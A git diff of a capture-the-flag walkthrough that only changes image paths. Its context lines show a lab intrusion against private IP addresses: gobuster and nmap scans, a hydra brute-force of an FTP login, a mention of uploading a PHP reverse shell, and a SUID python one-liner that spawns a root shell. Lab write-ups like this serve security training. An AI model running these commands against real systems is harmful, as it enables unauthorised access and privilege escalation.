@@ -8,7 +8,7 @@ Questions Walkthrough:
 1. How many new clients does the CEO of Orbitronix Systems, Emily Johnson, claim they have gained?
 
 
-![](Assets/Pasted%20image%2020251028142452.png)
+![](../Assets/Pasted%20image%2020251028142452.png)
 
 Answer: 3500
 
@@ -22,7 +22,7 @@ gobuster dir -u "http://172.20.25.114" -w /usr/share/wordlists/dirb/common.txt -
 ```
 
 
-![](Assets/Pasted%20image%2020251028143058.png)
+![](../Assets/Pasted%20image%2020251028143058.png)
 
 We found a hidden directory `/ftp` lets explore it.
 
@@ -49,7 +49,7 @@ In order to access to this info we need to gain access to the server. Lets perfo
 nmap -sSVC 172.20.58.90
 ```
 
-![](Assets/Pasted%20image%2020251028143206.png)
+![](../Assets/Pasted%20image%2020251028143206.png)
 
 ```
 PORT   STATE SERVICE VERSION
@@ -66,7 +66,7 @@ Connecting anonymously to the FTP server didn't work so lets try a hydra attack 
 hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://172.20.58.90
 ```
 
-![](Assets/Pasted%20image%2020251028143502.png)
+![](../Assets/Pasted%20image%2020251028143502.png)
 
 Bingo we found that the password is `password` lets enumerate the ftp server.
 
@@ -74,7 +74,7 @@ Bingo we found that the password is `password` lets enumerate the ftp server.
 ftp 172.20.58.90
 ```
 
-![](Assets/Pasted%20image%2020251028143555.png)
+![](../Assets/Pasted%20image%2020251028143555.png)
 
 We just found the already known `clients.csv` lets try to upload a php reverse shell and access it via the website.
 ```
@@ -96,14 +96,14 @@ Lets look for files with SETUID bit set.
 find / -perm -4000 2>/dev/null
 ```
 
-![](Assets/Pasted%20image%2020251028144201.png)
+![](../Assets/Pasted%20image%2020251028144201.png)
 
 Great we found that /usr/bin/python3.9 has the SUID bit set. Lets exploit it to get a root shell.
 ```
 /usr/bin/python3.9 -c "import os;os.setuid(0);os.system('bash')"
 ```
 
-![](Assets/Pasted%20image%2020251028144408.png)
+![](../Assets/Pasted%20image%2020251028144408.png)
 
 Great now lets enumerate
 
